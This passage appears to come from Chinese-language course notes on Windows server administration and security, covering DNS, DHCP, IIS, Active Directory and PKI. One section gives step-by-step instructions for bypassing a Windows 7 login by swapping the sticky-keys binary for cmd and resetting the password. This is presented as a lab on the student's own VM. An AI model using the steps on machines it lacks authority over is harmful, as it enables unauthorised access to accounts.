title="远程管理模型"></a>远程管理模型</h2><p>windows远程管理有两种类型：远程桌面（图形），telnet（命令行）</p><h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><p>拓扑图<br>客户机xp10.1.1.1————-Vmnet1————-服务器2003 10.1.1.2<br>步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先配置网络，实现客户机与服务器可以互通</span><br><span class="line">服务器开启允许被远程控制：桌面右键属性—远程设置—选择允许—确定</span><br><span class="line">客户机上：开始--运行--输入mstsc 打开远程连接工具</span><br><span class="line">在mstsc工具上输入服务器的ip并点击确定</span><br><span class="line">输入服务器的账户密码</span><br></pre></td></tr></table></figure><p>注*：如使用非管理员账户登录远程，需要在服务器上将用户加入到远程桌面内置组Remote Desktop Users中</p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>服务器上：services.msc<br>客户机上：telnet 目标ip地址<br>netstat -an #查看本机开放的所有端口<br>telnet :23<br>远程桌面协议RD：3389</p><h1 id="破解windows系统密码"><a href="#破解windows系统密码" class="headerlink" title="破解windows系统密码"></a>破解windows系统密码</h1><h2 id="利用五次shift漏洞破解win7密码"><a href="#利用五次shift漏洞破解win7密码" class="headerlink" title="利用五次shift漏洞破解win7密码"></a>利用五次shift漏洞破解win7密码</h2><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p><code>未登录时，连续五次shift键，弹出c:\windows\system32\sethc.exe</code><br><code>部分win7及win10系统在未进入系统时，可以通过系统修复漏洞篡改系统文件名，如win7/win10已修补漏洞，则无法利用</code></p><h3 id="破解过程及相关知识"><a href="#破解过程及相关知识" class="headerlink" title="破解过程及相关知识"></a>破解过程及相关知识</h3><p>cmd工具路径c:\windows\system32\cmd<br>用户/账户密码存储位置 c:\windows\system32\config\SAM # 非逆型加密，使用hash值类似方法，Md5，SHA</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>案例 破解win7系统密码<br>步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">开启win7虚拟机，开机，并设置一个复杂密码</span><br><span class="line">关机，开机，在出现Windows的启动界面时强制关机</span><br><span class="line">再开机，出现&quot;启动修复(推荐)&quot;及选择选项。  # 未出现多试几次，如还不行，换其他方法</span><br><span class="line">出现系统还原提示，点击取消，等几分钟后，会出现问题原因，点击查看详细信息</span><br><span class="line">打开最后一个链接即记事本</span><br><span class="line">记事本中点击打开，并选择显示所有文件</span><br><span class="line">找到sethc并改名为sethc-bak，再找到cmd，复制一份cmd改名为sethc</span><br><span class="line">全部关闭，重启</span><br><span class="line">系统启动完毕后，连续五次shift键，弹出cmd工具，使用命令net user 用户名 新密码，将当前用户名密码修改即可(或者另外新建一个用户，提升为管理员，注销后可再删除新建用户，这样子的好处为不修改当前用户的密码就可以登录)</span><br></pre></td></tr></table></figure><h2 id="利用PE系统破解xp密码"><a href="#利用PE系统破解xp密码" class="headerlink" title="利用PE系统破解xp密码"></a>利用PE系统破解xp密码</h2><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>PE系统独立于硬盘系统的微型系统，通过pe系统启动可以对系统的SAM文件做修改</p><h3 id="破解过程相关理论"><a href="#破解过程相关理论" class="headerlink" title="破解过程相关理论"></a>破解过程相关理论</h3><p>见8系列</p><h1 id="NTFS安全权限"><a href="#NTFS安全权限" class="headerlink" title="NTFS安全权限"></a>NTFS安全权限</h1><h2 id="NTFS权限概述"><a href="#NTFS权限概述" class="headerlink" title="NTFS权限概述"></a>NTFS权限概述</h2><p>1、通过设置NTFS权限，实现不同的用户访问不同的权限<br>2、分配了正确的访问权限后，才能访问其资源<br>3、设置权限防止资源被篡改、删除</p><h2 id="文件系统概述"><a href="#文件系统概述" class="headerlink" title="文件系统概述"></a>文件系统概述</h2><p>文件系统即外部存储设备上组织文件的方法<br>常用文件系统：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FAT windows</span><br><span class="line">NTFS windows</span><br><span class="line">EXT Linux常见</span><br></pre></td></tr></table></figure><p>格式化==制作文件系统<br>一个block只能被一个文件使用</p><h3 id="NTFS文件系统特点"><a href="#NTFS文件系统特点" class="headerlink" title="NTFS文件系统特点"></a>NTFS文件系统特点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提高磁盘读写性能</span><br><span class="line">可靠性、加密文件系统、访问控制列表(设置权限)ACL</span><br><span class="line">磁盘利用率、压缩、磁盘配额</span><br><span class="line">支持单个文件大于4G</span><br></pre></td></tr></table></figure><h2 id="修改NTFS权限"><a href="#修改NTFS权限" class="headerlink" title="修改NTFS权限"></a>修改NTFS权限</h2><h3 id="取消权限继承"><a href="#取消权限继承" class="headerlink" title="取消权限继承"></a>取消权限继承</h3><p>作用：取消后，可以任意修改权限列表<br>方法：文件夹右键属性–安全–高级–去掉第一个对号√–选择复制即可</p><h3 id="文件及文件夹权限"><a href="#文件及文件夹权限" class="headerlink" title="文件及文件夹权限"></a>文件及文件夹权限</h3><h4 id="文件权限-amp-amp-权限内容"><a href="#文件权限-amp-amp-权限内容" class="headerlink" title="文件权限  &amp;&amp;  权限内容"></a>文件权限  &amp;&amp;  权限内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">完全控制  &amp;&amp;  拥有读取、写入、修改、删除及特殊的权限</span><br><span class="line">修改  &amp;&amp;  拥有读取、写入、修改、删除的权限</span><br><span class="line">读取和执行  &amp;&amp;  拥有读取以及执行文件的权限</span><br><span class="line">读取  &amp;&amp;  拥有读取的权限</span><br><span class="line">写入  &amp;&amp;  拥有修改文件内容的权限</span><br><span class="line">特殊权限  &amp;&amp;  拥有控制文件权限列表的权限</span><br></pre></td></tr></table></figure><h4 id="文件夹权限-权限内容"><a href="#文件夹权限-权限内容" class="headerlink" title="文件夹权限  ** 权限内容"></a>文件夹权限  ** 权限内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">完全控制  **  拥有对文件夹中文件的读取、写入、修改、删除及特殊的权限</span><br><span class="line">修改  **  拥有对文件夹中文件的读取、写入、修改的权限</span><br><span class="line">读取和执行  **  拥有对文件夹中文件的读取以及执行的权限</span><br><span class="line">列出文件夹内容  **  可以列出文件夹的内容</span><br><span class="line">读取  **  拥有对文件夹中文件的下载、读取的权限</span><br><span class="line">写入  **  拥有对文件夹中文件修改的权限</span><br><span class="line">特殊权限  **  拥有控制文件夹权限列表的权限</span><br></pre></td></tr></table></figure><h3 id="权限累加"><a href="#权限累加" class="headerlink" title="权限累加"></a>权限累加</h3><p>当用户属于多个组时，权限是累加的！</p><h3 id="拒绝最大"><a href="#拒绝最大" class="headerlink" title="拒绝最大"></a>拒绝最大</h3><p>当用户权限累加时，如遇到拒绝权限，拒绝最大！</p><h3 id="取得所有权"><a href="#取得所有权" class="headerlink" title="取得所有权"></a>取得所有权</h3><p>默认只有administrator有这个权限<br>作用：可以将任何文件夹的所有者改为administrator</p><h3 id="强制继承"><a href="#强制继承" class="headerlink" title="强制继承"></a>强制继承</h3><p>作用：对下强制继承父子关系<br>方法：文件夹右键属性–安全–高级–勾上第二个对号√ 即可</p><h3 id="文件复制对权限的影响"><a href="#文件复制对权限的影响" class="headerlink" title="文件复制对权限的影响"></a>文件复制对权限的影响</h3><p>文件复制后，文件的权限会被目标文件夹的权限覆盖</p><h1 id="文件共享服务器"><a href="#文件共享服务器" class="headerlink" title="文件共享服务器"></a>文件共享服务器</h1><h2 id="共享服务器概述"><a href="#共享服务器概述" class="headerlink" title="共享服务器概述"></a>共享服务器概述</h2><p>通过网络提供文件共享服务，提供文件下载和上传服务(类似ftp服务器)   (CIFS 微软)</p><h2 id="创建共享"><a href="#创建共享" class="headerlink" title="创建共享"></a>创建共享</h2><p>方法：文件夹右键属性–共享–开启共享–设置共享名–设置共享权限<br>注*：<br>本地登录时，只受NTFS权限影响<br>在远程登录时，将受共享及NTFS权限的共同影响<br>所以建议设置共享权限为everyone完全控制，然后具体权限需求在NTFS权限设置即可</p><h2 id="访问共享"><a href="#访问共享" class="headerlink" title="访问共享"></a>访问共享</h2><p>在<code>开始运行</code>/<code>我的电脑</code>地址栏输入<code>UNC地址</code>:<br>\文件共享服务器IP<br>\文件共享服务器IP\共享名</p><h2 id="创建隐藏的共享"><a href="#创建隐藏的共享" class="headerlink" title="创建隐藏的共享"></a>创建隐藏的共享</h2><p>方法：共享名$</p><h2 id="访问隐藏共享的方法"><a href="#访问隐藏共享的方法" class="headerlink" title="访问隐藏共享的方法"></a>访问隐藏共享的方法</h2><p>\服务器IP\共享名$</p><h2 id="共享相关命令"><a href="#共享相关命令" class="headerlink" title="共享相关命令"></a>共享相关命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share   #列出共享列表</span><br><span class="line">net share 共享名 &#x2F;del   #删除共享</span><br></pre></td></tr></table></figure><h2 id="屏蔽系统隐藏共享自动产生"><a href="#屏蔽系统隐藏共享自动产生" class="headerlink" title="屏蔽系统隐藏共享自动产生"></a>屏蔽系统隐藏共享自动产生</h2><h3 id="打开注册表的编辑器：regedit"><a href="#打开注册表的编辑器：regedit" class="headerlink" title="打开注册表的编辑器：regedit"></a>打开注册表的编辑器：regedit</h3><h3 id="定位共享注册表位置"><a href="#定位共享注册表位置" class="headerlink" title="定位共享注册表位置"></a>定位共享注册表位置</h3><p>HKEY_Local_MACHINE\System\CurrentControlSet\Services\Lanmanserver\Parameters<br>右键新建REG_DWORD类型的AutoShareServer键，值为0</p><h2 id="查看本地网络连接状态"><a href="#查看本地网络连接状态" class="headerlink" title="查看本地网络连接状态"></a>查看本地网络连接状态</h2><p>netstat -an          （3389 桌面  23 telnet协议   445 文件共享服务)</p><h2 id="关闭445服务"><a href="#关闭445服务" class="headerlink" title="关闭445服务"></a>关闭445服务</h2><p>可以通过445端口来屏蔽病毒传入(如勒索病毒)<br>方法1：打开services.msc，并停止及禁用server服务<br>方法2：禁止被访问445，配置高级安全防火墙-入站规则(win7及以上，win2008及以上)</p><h1 id="DNS部署与安全"><a href="#DNS部署与安全" class="headerlink" title="DNS部署与安全"></a>DNS部署与安全</h1><h2 id="DNS-1"><a href="#DNS-1" class="headerlink" title="DNS"></a>DNS</h2><p>Domain Name Service 域名服务<br>作用：为客户机提供域名解析服务</p><h2 id="域名组成"><a href="#域名组成" class="headerlink" title="域名组成"></a>域名组成</h2><h3 id="域名组成概述"><a href="#域名组成概述" class="headerlink" title="域名组成概述"></a>域名组成概述</h3><p>如<a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a> 是一个域名，从严格意义上讲，<code>sina.com.cn</code> 才被称为域名(全球唯一)，而<code>www</code>是主机名<br>“主机名.域名”称为完全限定域名(FQDN)，一个域名下可以有各个主机，域名全球唯一，那么”主机名.域名”也肯定是全球唯一<br>以”sina.com.cn”域名为例，一般管理员在命名其主机的时候会根据其主机的功能而命名，比如网站是www，博客是blog，论坛的是bbs，那么对应的FQDN为<a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a> ,  blog.sina.com.cn ,  bbs.sina.com.cn ，这多个FQDN然鹅只需要申请一个域名即可</p><h3 id="域名组成-1"><a href="#域名组成-1" class="headerlink" title="域名组成"></a>域名组成</h3><p>根域<br>顶级域<br>——-国家顶级域 cn,jp,hk,uk<br>——-商业顶级域<br>——————com 商业机构<br>——————gov 政府机构<br>——————mil 军事机构<br>——————edu 教育机构<br>——————org 民间组织机构<br>——————net 互联网<br>二级域<br>三级域<br>···<br>###############################<br>如<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>. 为根域<br>.com 为顶级域<br>baidu 为二级域名<br>www 为主机名</p><p>FQDN=主机名.DNS后缀  (完整合格的域名)</p><h2 id="监听窗口"><a href="#监听窗口" class="headerlink" title="监听窗口"></a>监听窗口</h2><p>TCP53<br>UDP53</p><h2 id="DNS解析种类"><a href="#DNS解析种类" class="headerlink" title="DNS解析种类"></a>DNS解析种类</h2><h3 id="按照查询方式分类"><a href="#按照查询方式分类" class="headerlink" title="按照查询方式分类"></a>按照查询方式分类</h3><p>1）递归查询：客户机与本地DNS服务器之间<br>2）迭代查询：本地DNS服务器与根等其他DNS服务器的解析过程<br>DNS解析过程：</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DNS%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B.png" class=""><h3 id="按照查询内容分类"><a href="#按照查询内容分类" class="headerlink" title="按照查询内容分类"></a>按照查询内容分类</h3><p>1）正向解析：已知域名，解析IP地址<br>2）反向解析：已知IP地址，解析域名</p><h2 id="DNS服务器搭建过程"><a href="#DNS服务器搭建过程" class="headerlink" title="DNS服务器搭建过程"></a>DNS服务器搭建过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">要求网卡IP是静态IP地址</span><br><span class="line">安装DNS服务器插件(也就是安装并开启TCP及UDP53端口)</span><br><span class="line">创建区域文件(负责一个域名后缀的解析，如baidu.com为域名后缀，一台DNS服务器内课存放多个区域文件)</span><br><span class="line">新建A记录</span><br></pre></td></tr></table></figure><h2 id="DNS请求顺序"><a href="#DNS请求顺序" class="headerlink" title="DNS请求顺序"></a>DNS请求顺序</h2><p>客户机处理DNS请求顺序：DNS缓存–本地hosts文件–找本地DNS服务器<br>服务器处理DNS请求顺序：DNS高速缓存–本地区域解析文件–转发器– 根</p><h2 id="DNS服务器分类"><a href="#DNS服务器分类" class="headerlink" title="DNS服务器分类"></a>DNS服务器分类</h2><p>主要名称服务器<br>辅助名称服务器<br>根名称服务器<br>高速缓存名称服务器</p><h2 id="辅助DNS服务器"><a href="#辅助DNS服务器" class="headerlink" title="辅助DNS服务器"></a>辅助DNS服务器</h2><h2 id="清除DNS缓存"><a href="#清除DNS缓存" class="headerlink" title="清除DNS缓存"></a>清除DNS缓存</h2><h3 id="客户机上清除缓存"><a href="#客户机上清除缓存" class="headerlink" title="客户机上清除缓存"></a>客户机上清除缓存</h3><p><code>ipconfig /flushdns</code></p><h3 id="服务器上清除缓存"><a href="#服务器上清除缓存" class="headerlink" title="服务器上清除缓存"></a>服务器上清除缓存</h3><p>windows服务器：dns工具–查看–高级–调出缓存–右键清除缓存</p><h2 id="域名解析记录类型"><a href="#域名解析记录类型" class="headerlink" title="域名解析记录类型"></a>域名解析记录类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A记录：正向解析记录</span><br><span class="line">CNAME：别名</span><br><span class="line">PTR记录：反向解析记录</span><br><span class="line">MX：邮件交换记录</span><br><span class="line">NS：域名服务器解析</span><br></pre></td></tr></table></figure><h2 id="反向DNS"><a href="#反向DNS" class="headerlink" title="反向DNS"></a>反向DNS</h2><p>nslookup 手工解析时，会进行一个反向解析</p><h2 id="具体DNS配置步骤"><a href="#具体DNS配置步骤" class="headerlink" title="具体DNS配置步骤"></a>具体DNS配置步骤</h2><p><a href="https://www.bilibili.com/video/BV1i7411G7vm?p=30" target="_blank" rel="noopener">b站视频</a></p><h1 id="DHCP部署与安全"><a href="#DHCP部署与安全" class="headerlink" title="DHCP部署与安全"></a>DHCP部署与安全</h1><h2 id="DHCP作用"><a href="#DHCP作用" class="headerlink" title="DHCP作用"></a>DHCP作用</h2><p>自动分配IP地址  Dynamic Host Configuration Protocol  动态主机配置协议</p><h2 id="DHCP相关概念"><a href="#DHCP相关概念" class="headerlink" title="DHCP相关概念"></a>DHCP相关概念</h2><p>地址池/作用域：(IP、子网掩码、网关、DNS、租期)DHCP协议端口 UDP 67/68</p><h2 id="DHCP优点"><a href="#DHCP优点" class="headerlink" title="DHCP优点"></a>DHCP优点</h2><p>减少工作量、避免IP冲突、提高地址利用率</p><h2 id="DHCP原理"><a href="#DHCP原理" class="headerlink" title="DHCP原理"></a>DHCP原理</h2><p>(也成为DHCP租约过程，约4个步骤)<br>1）客户机发送DHCP Discovery广播包<br><code>客户机广播请求IP地址(包含客户机的MAC地址)</code><br>2）服务器响应DHCP Offer广播包<br><code>服务器相应提供的IP地址(但无子网掩码、网关等参数)</code><br>3）客户机发送DHCP Request广播包<br><code>客户机选择IP(也可以认为确认使用哪个IP)</code><br>4）服务器发送DHCP ACK广播包<br><code>服务器确定了租约，并提供网卡详细参数IP、掩码、网关、租期等</code></p><h2 id="DHCP续约"><a href="#DHCP续约" class="headerlink" title="DHCP续约"></a>DHCP续约</h2><p>50%过后，客户机会再次发送DHCP Request包，进行续约，如服务器无响应，则继续使用并在87.5%再次发送DHCP Request包，如仍然无响应，并释放IP地址及重新发送DHCP Discovery广播包来获取IP地址<br>当无任何服务器响应时，自己给自己分配一个169.254.X.X/16，属于全球统一无效地址，用于临时内网通信</p><h2 id="部署DHCP服务器"><a href="#部署DHCP服务器" class="headerlink" title="部署DHCP服务器"></a>部署DHCP服务器</h2><p>1）IP地址固定(服务器必须固定IP地址)<br>2）安装DHCP服务插件<br>3）新建作用域及作用域选项<br>4）激活<br>5）客户机验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;release  释放IP(取消租约，或改为手动配置IP，也可以释放租约)</span><br><span class="line">ipconfig &#x2F;renew  重新获取IP(有IP时发送request续约，无IP时发送Discovery重新获取IP)</span><br></pre></td></tr></table></figure><h2 id="地址保留"><a href="#地址保留" class="headerlink" title="地址保留"></a>地址保留</h2><p>对指定的MAC地址，固定动态分配IP地址</p><h2 id="选项优先级"><a href="#选项优先级" class="headerlink" title="选项优先级"></a>选项优先级</h2><p>作用域选项&gt;服务器选项<br>当服务器上有多个作用域时，可以在服务器选项上设置DNS服务器</p><h2 id="DHCP备份"><a href="#DHCP备份" class="headerlink" title="DHCP备份"></a>DHCP备份</h2><p>右键</p><h2 id="DHCP攻击与防御"><a href="#DHCP攻击与防御" class="headerlink" title="DHCP攻击与防御"></a>DHCP攻击与防御</h2><p>1）攻击DHCP服务器：频繁的发送伪装的DHCP请求，直到将DHCP地址资源耗尽<br>      防御：在交换机上(管理型交换机)的端口上做动态MAC地址分配</p><p>2）伪装DHCP服务器攻击：hack通过将自己部署为DHCP服务器，为客户机提供非法IP地址<br>      防御：在交换机上，除合法的DHCP服务器所在接口外，全部设置为禁止发送DHCP Offer包(管理型交换机)</p><h1 id="IIS之web服务器"><a href="#IIS之web服务器" class="headerlink" title="IIS之web服务器"></a>IIS之web服务器</h1><ol><li>web服务器也称为网页服务器或HTTP服务器</li><li>web服务器使用的协议是HTTP或HTTPS</li><li><code>HTTP协议端口号：TCP 80</code>，<code>HTPPS协议端口号：TCP 443</code></li><li>WEB服务器发布软件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">微软：IIS  互联网信息服务(可以发布web网站和ftp站点)</span><br><span class="line">Linux：Apache、LAMP、Tomcat、nginx、、、、</span><br><span class="line">第三方(实验用)：phpstudy、XAMPP</span><br></pre></td></tr></table></figure></li><li>部署web服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">配置静态IP地址</span><br><span class="line">安装IIS-WEB插件</span><br><span class="line">使用默认站点</span><br><span class="line">新建网站--地址端口绑定--指定站点路径--设置权限</span><br><span class="line">设置默认文档(设置首页)</span><br></pre></td></tr></table></figure></li><li>一台服务器发布多个web站点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不同的IP，相同的端口</span><br><span class="line">相同的IP，不同的端口</span><br><span class="line">相同的IP，相同的端口，不同的域名(主机头)</span><br></pre></td></tr></table></figure></li><li>站点类型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">静态网站：一般扩展名为.htm或.html(无后台数据库)</span><br><span class="line">动态网站：一般扩展名为.asp或.php(有后台数据库，asp或php可以连接前台页面与后台数据库)</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="IIS之FTP服务器"><a href="#IIS之FTP服务器" class="headerlink" title="IIS之FTP服务器"></a>IIS之FTP服务器</h1><h2 id="File-Transfor-Protocol"><a href="#File-Transfor-Protocol" class="headerlink" title="File Transfor Protocol"></a>File Transfor Protocol</h2><p>文件传输协议</p><h2 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h2><p>TCP 20/21</p><h2 id="FTP工作方式"><a href="#FTP工作方式" class="headerlink" title="FTP工作方式"></a>FTP工作方式</h2><p>1)主动模式<br>21端口：控制端口<br>20端口：数据端口</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F.png" class=""><p>2)被动模式<br>21端口+随机端口作为数据传输端口</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F.png" class=""><p>注意：<br>主被动模式，阐述的是数据传输过程<br>主被动模式，选择权在客户机上<br>主被动模式，所谓主或被是站在服务器的角度</p><h2 id="部署FTP服务器"><a href="#部署FTP服务器" class="headerlink" title="部署FTP服务器"></a>部署FTP服务器</h2><p>1)配置静态IP<br>2)安装IIS-ftp软件<br>3)使用默认站点或创建新的站点<br>注：用户最终权限为FTP权限与NTFS权限取交集<br>建议：FTP权限全部勾选，然后具体的NTFS里做<br>4)去掉匿名访问对勾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">作业：</span><br><span class="line">同时发布2个动态网站，并成功分别用域名访问</span><br><span class="line">使用IIS实现学校FTP服务器的访问效果</span><br></pre></td></tr></table></figure><h1 id="域"><a href="#域" class="headerlink" title="域"></a>域</h1><h2 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h2><h2 id="内网环境"><a href="#内网环境" class="headerlink" title="内网环境"></a>内网环境</h2><p>1)工作组：默认模式，人人平等，不方便管理<br>2)域：人人不平等，集中管理，同一管理</p><h2 id="域的特点"><a href="#域的特点" class="headerlink" title="域的特点"></a>域的特点</h2><p>集中/统一管理</p><h2 id="域的组成"><a href="#域的组成" class="headerlink" title="域的组成"></a>域的组成</h2><p>1)域控制器：DC(Domain Controller)<br>2)成员机</p><h2 id="域的部署"><a href="#域的部署" class="headerlink" title="域的部署"></a>域的部署</h2><p>1)安装域控制器–就生成了域环境<br>2)安装了活动目录–就生成了域控制器<br>3)活动目录：Active Directory=AD</p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>1)AD<br>2)特点：集中管理/统一管理</p><h2 id="组策略GPO"><a href="#组策略GPO" class="headerlink" title="组策略GPO"></a>组策略GPO</h2><h2 id="部署安装活动目录"><a href="#部署安装活动目录" class="headerlink" title="部署安装活动目录"></a>部署安装活动目录</h2><p>1)开启2008虚拟机，连接到vmnet2<br>2)配置静态IP地址10.1.1.1<br>3)开始-运行-输入dcpromo，安装活动目录：<br>弹出向导-新林中新建域-功能级别都设置为2003-域的FQDN(xxx.com)-<strong>设置目录服务还原密码</strong>-勾选安装后自动重启<br>4)在DC上登录域<code>**\administrator</code>—DC的本地管理员升级为域管理员<br>5)验证AD是否安装成功：<br>计算机右键属性-所属域<br>DNS服务器中是否自动创建**.com区域文件<br>自动注册DC的域名解析记录<br>开始-管理工具-AD用户和计算机(computer：普通域成员机列表、Domain Controller：DC列表、users：域账号)</p><h2 id="PC加入域"><a href="#PC加入域" class="headerlink" title="PC加入域"></a>PC加入域</h2><p>1.配置IP，并指DNS<br>2.计算机右键属性–更改–加入**.com<br>3.重启加入域后，成功使用域用户登录成员机</p><h2 id="常见小问题"><a href="#常见小问题" class="headerlink" title="常见小问题"></a>常见小问题</h2><p>加入域不成功</p><ol><li>网络是不是不通</li><li>解析是否能成功解析</li><li>是否为DNS缓存问题</li></ol><p>登入域不成功</p><p>域用户的权限</p><ol><li>建议将域用户加入到普通成员机的本地管理员组中</li></ol><p><strong>本地管理员组：administrators</strong><br><strong>域管理员组：Domain Admins</strong></p><h2 id="OU：组织单位"><a href="#OU：组织单位" class="headerlink" title="OU：组织单位"></a>OU：组织单位</h2><p>作用：用于归类域资源（域用户、域计算机、域。。。）</p><h2 id="组策略：Group-Policy-GPO"><a href="#组策略：Group-Policy-GPO" class="headerlink" title="组策略：Group Policy=GPO"></a>组策略：Group Policy=GPO</h2><p>作用：通过组策略可以修改计算机的各种属性，如开始桌面、桌面背景、网络参数等。<br><strong>重点</strong><br>组策略在域中，是基于OU发下来的！！！<br>组策略在域中下发后，用户的应用顺序是：LSDOU<br>在应用过程中，如果出现冲突，后应用的生效<br>组策略的组织继承及强制1</p><p><strong>正常情况下：LSDOU顺序</strong><br>上级OU： 桌面：aa 运行：删除<br>下级OU： 桌面：未配置  运行：不删除<br>下级OU用户结果：桌面：aa 运行：不删除</p><p><strong>下级OU设置了阻止继承</strong><br>上级OU：桌面：aa  运行：删除<br>桌面OU：桌面：未配置   运行：不删除<br>下级OU的用户结果： 桌面：未配置  运行：不删除</p><p><strong>上级设置了强制</strong><br>上级OU：桌面：aa  运行：删除<br>下级OU：桌面：未配置   运行：不删除<br>下级OU的用户结果： 桌面：aa  运行：删除</p><p><em>注意：当上级强制和下级阻值继承同时设置，强制生效！</em></p><h2 id="复习"><a href="#复习" class="headerlink" title="复习"></a>复习</h2><p>域的特点：集中管理<br>活动目录的特点：集中管理</p><p>域Domain<br>域控制器Domain Controller=DC<br>活动目录Active Directory=AD</p><p>在域中，组策略的应用顺序是：LSDOU</p><h1 id="PKI"><a href="#PKI" class="headerlink" title="PKI"></a>PKI</h1><h2 id="PKI概述"><a href="#PKI概述" class="headerlink" title="PKI概述"></a>PKI概述</h2><p><code>名称</code>：Public Key Infrastructure 公钥基础设施<br><code>作用</code>：通过加密技术和数字签名保证信息的安全<br><code>组成</code>：公钥加密技术、数字证书、CA、RA</p><h2 id="信息安全三要素"><a href="#信息安全三要素" class="headerlink" title="信息安全三要素"></a>信息安全三要素</h2><ol><li><code>机密性</code></li><li><code>完整性</code></li><li><code>身份验证/操作的不可否认性</code></li></ol><h2 id="哪些IT领域用到PKI"><a href="#哪些IT领域用到PKI" class="headerlink" title="哪些IT领域用到PKI"></a>哪些IT领域用到PKI</h2><ol><li>SSL/HTTPS</li><li>IPsecVPN</li><li>部分远程访问VPN</li></ol><h2 id="公钥加密技术"><a href="#公钥加密技术" class="headerlink" title="公钥加密技术"></a>公钥加密技术</h2><p><code>作用</code>：实现对<code>信息加密</code>、<code>数字签名</code>等安全保障<br><strong>加密算法</strong>：</p><ol><li>对称加密算法<br>加解密的密钥一致！<br>例：DES、3DES、AES</li><li>非对称加密算法<br>通信双方各自产生一对公私钥<br>双方各自交换公钥<br>公钥和私钥互相加解密关系<br>公私钥不可互相推逆<br>例：RSA、DH</li></ol><p><code>x+5=y(对称加密算法)</code>，x是原数据/原文，y是密文，5是key/密钥</p><p>HASH算法：MD5、SHA(验证完整性)<br>HASH值可逆吗？不可逆！<br>HASH值=摘要</p><h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>用自己的私钥对摘要加密得出的密文就是数字签名</p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>证书用于保证密钥的合法性<br>证书格式遵循X.509标准<br>数字证书包含信息：</p><ol><li>使用者的公钥值</li><li>使用者标识信息(如名称和电子邮件地址)</li><li>有效期(证书的有效时间)</li><li>颁发者标识信息</li><li>颁发者的数字签名</li></ol><p>数字证书由权威公正的第三方机构即CA签发</p><p>CA是权威证书颁发机构，为了公正”公钥”的合法性！<br>机密性：使用对方的公钥加密！<br>身份验证/数字签名：使用自己的私钥！</p><h2 id="渗透简单测试"><a href="#渗透简单测试" class="headerlink" 